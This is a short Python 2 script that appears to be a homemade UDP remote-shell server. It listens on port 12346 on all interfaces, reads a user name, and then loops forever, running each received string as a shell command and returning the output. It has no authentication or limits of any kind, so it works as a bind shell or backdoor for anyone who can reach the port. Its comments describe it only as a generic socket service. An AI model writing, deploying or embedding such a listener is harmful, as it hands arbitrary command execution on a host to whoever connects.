#!/usr/bin/python        

import socket,commands,os,subprocess               # Import socket and commands module

s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)         # Create a socket object

ip="0.0.0.0"
port = 12346             # Reserve a port for your service.
s.bind((ip, port))        # Bind to the port

data=s.recvfrom(100)
print data[1]
uname=data[0]
print uname
data1=s.recvfrom(100)
print data1[0]

while True:
	command=s.recvfrom(100)
	actual=command[0]
	print actual
	output=commands.getstatusoutput(actual)
	s.sendto(output[1],data[1])
